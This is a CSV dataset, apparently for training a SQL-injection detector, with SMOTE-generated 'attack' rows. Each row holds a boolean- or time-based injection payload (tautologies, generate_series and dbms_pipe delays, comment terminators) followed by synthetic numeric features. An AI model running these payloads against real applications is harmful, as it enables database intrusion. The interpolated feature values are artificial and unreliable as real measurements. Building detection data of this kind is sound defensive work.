id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,0.5374381481189987,95.1157061853427,28.447316365839193,3.589215174090677,30.784096004846226,13.0,39.11053672683216,12.221073453664323,0.3228658402621059,0.1367774407659262,0.41158842146632596,0.12876829750564187,1.331610180496484,1.1102230246251565e-16,0.0,0.0,0.8894632731678387,1.1105367268321613,0.0,6.889463273167839,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8894632731678387,0.0,0.0,0.8894632731678387,1.110536726832161,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8894632731678387
SMOTE_000012,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.920162965196957,92.08127354263104,24.416456483941943,3.3852440035984737,22.749117232556163,13.0,42.1655737164981,14.166582593576777,0.24429458958773143,0.14332643032065334,0.4568115084063198,0.15556747168529544,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,6.333165187153553,0.0,0.9167087032116115,0.9167087032116116,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0832912967883884,0.0,0.08329129678838854,0.0,0.0,0.0,1.9167087032116115,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0832912967883884,0.0832912967883884,2.166582593576777
SMOTE_000013,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.10152443962954569,136.8135950180337,32.0,4.224537384600766,69.0,16.0,37.65087601442698,14.162719003606743,0.5044254246847973,0.11696821441966314,0.2751051377917616,0.1035012231037779,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.162719003606744,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000014,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000009,0.568488846770988,73.07593210496569,25.77220368510296,3.8013514345077724,14.531524734759767,23.16474684537751,24.303728419862725,11.07593210496568,0.198766800475369,0.31714256741824914,0.33253421031669794,0.15155642178968384,0.3037284198627237,0.9240678950343191,2.772203685102957,0.0,0.0,2.0,0.0,3.0759321049656805,0.0,1.0,1.0,4.772203685102957,0.07593210496568087,0.924067895034319,0.9240678950343191,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9240678950343191,0.0,0.15186420993136196,0.9240678950343191,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.7073147556647073,76.01850495932376,22.873843440042265,3.538127192975957,19.359964720549453,13.378469679873204,30.52313119915469,12.756939359746408,0.2591965142905196,0.1759408696455568,0.39792696244390124,0.16693565362002238,4.0,1.1102230246251565e-16,0.12615655995773456,0.0,0.0,2.0,0.0,4.504626239830938,0.2523131199154691,0.8738434400422654,1.0,2.1261565599577343,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8738434400422654,0.12615655995773456,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000016,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,0.08300507308824534,95.77949127350493,28.91179650940197,3.609163602584181,31.79419185527126,13.0,38.98529941823366,12.0,0.3316999353592957,0.13578531551497375,0.4071744578811393,0.12534029124459117,0.9852994182336615,0.05880232706535349,0.0,0.0,1.0,1.0,0.0,6.985299418233661,0.0,0.9852994182336616,0.9852994182336616,2.0,0.9852994182336616,0.014700581766338539,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9852994182336615,0.0,0.0,0.9852994182336616,1.0147005817663384,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.985299418233662
SMOTE_000017,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.9115896569491166,147.80451151313113,33.967418585521855,4.288664374130787,73.59064336621766,16.655806195173952,40.93483717104371,16.623224780695807,0.49827235501334766,0.11288757917940982,0.27675567844137183,0.11208438736587059,0.655806195173952,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.655806195173952,0.0,0.0,2.6558061951739522,5.0,0.655806195173952,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,2.2260793106830494,91.66276225880736,26.289226411754598,3.4922615013826617,26.03629810586012,13.0,39.54215471764908,13.08430943529816,0.2819929244650492,0.1420909198195436,0.43243360852282486,0.14348254719258227,2.6264641529472406,1.1102230246251565e-16,0.0,0.0,0.45784528235091976,1.5421547176490802,0.0,6.45784528235092,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4578452823509198,0.0,0.0,0.45784528235091976,1.5421547176490802,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.45784528235092
SMOTE_000019,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,0.5670677598668622,86.5548809486574,22.44451190513426,3.1544140437212964,18.0,13.0,42.44390475892592,13.11097618973148,0.208657189380568,0.15069685899707688,0.4893326291444876,0.15131332247786747,0.0,4.0,0.0,0.0,1.0,1.0,0.0,7.110976189731479,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.3665243326144132,139.39872052546434,32.30897459322403,4.192250928523914,69.61794918644807,13.837177847431775,40.08974593224032,15.853847559344192,0.49982639921468064,0.10021391850956841,0.28678735430884866,0.11317232796690221,0.3089745932240322,1.1102230246251565e-16,2.0,0.0,1.0,1.6910254067759678,0.0,4.926923779672096,0.3089745932240321,0.0,2.308974593224032,4.691025406775968,0.3089745932240321,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.691025406775968,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.691025406775968
SMOTE_000021,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.5826491760880023,78.7502321952589,23.339302299661348,3.5475577063447927,21.0,13.0,32.0716275959362,12.6786045993227,0.2684651603039869,0.1661927182834205,0.40422204248034854,0.161120078932244,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.6786045993227,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000022,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,2.385215941309177,104.86732304858512,25.52120809045437,3.157089788476191,18.563624271363107,15.608754656616181,51.12996274707055,19.564981373535275,0.1610926736140624,0.15407211374289015,0.49583898792571734,0.1889962247173301,4.7824906867676376,1.1102230246251565e-16,0.6087546566161811,0.391245343383819,0.0,2.0,0.0,8.782490686767638,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3912453433838188,0.608754656616181,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.8353106456026824,121.68214983603897,28.79127035822511,4.135982649061518,73.7912703582251,4.978175895562773,28.538892507575763,14.373811074675327,0.6124842715584373,0.03926955705048642,0.23130484541794058,0.11694132597313578,3.3956351791125545,1.1102230246251565e-16,0.0,0.0,1.0,1.3956351791125547,0.0,2.79127035822511,0.7912703582251093,0.0,2.0,2.3956351791125545,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.3956351791125545,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3956351791125545
SMOTE_000024,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000031,2.4456326346689368,137.0,30.729469075540717,3.480607422998102,43.08091817221295,14.729469075540717,62.541061848918574,16.64855090332777,0.3144592567314814,0.1075143728141658,0.4565041010869969,0.12152226936735597,4.0,1.1102230246251565e-16,0.0,0.0,0.21618363444258948,2.0,0.0,9.567632731114822,0.0,0.21618363444258942,0.21618363444258937,2.6485509033277683,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7838163655574104,0.0,1.2161836344425896,0.0,0.21618363444258953,0.21618363444258948,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7838163655574104,0.7838163655574104,4.21618363444259
SMOTE_000025,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,0.4080021315254246,113.472055965269,28.34334110628736,4.19478918843204,72.86266355748506,3.412009327544835,24.64803731017934,12.54934577005978,0.645663759846553,0.029375305966885437,0.21493380242867682,0.11002713175788488,2.862663557485055,1.1102230246251565e-16,0.13733644251494503,0.0,1.0,1.0,0.0,2.3433411062873626,0.06866822125747252,0.0,2.0686682212574725,2.137336442514945,1.0,0.0,0.06866822125747252,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9313317787425275,0.06866822125747252,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000026,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000002,4.041969418363611,75.89702575953329,14.687346690128372,2.1900941126646223,5.910670482893821,7.642681931575282,46.95533524144691,15.388338103617276,0.07562330465329409,0.08491868812861425,0.6361416111591929,0.2033163960588987,1.9106704828938201,2.0893295171061794,0.47766762072345514,0.0,0.0,1.4776676207234551,0.0,8.0,0.9553352414469103,0.0,0.47766762072345514,1.9553352414469103,0.4776676207234551,0.5223323792765449,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4776676207234552,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4776676207234554
SMOTE_000027,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,2.5664259169938743,133.01067947147095,32.19057581650612,3.771531222300778,49.229109409133024,11.08565451009633,51.76230326602446,20.933612286217123,0.36510097133317776,0.09044128786797384,0.3914884073424636,0.15296933345638478,0.3618848366987768,1.9143454899036696,0.0,0.0,0.3618848366987768,1.0,0.0,10.190575816506115,0.0,1.6381151633012232,1.0,5.190575816506116,0.3618848366987768,0.6381151633012232,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6381151633012232,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
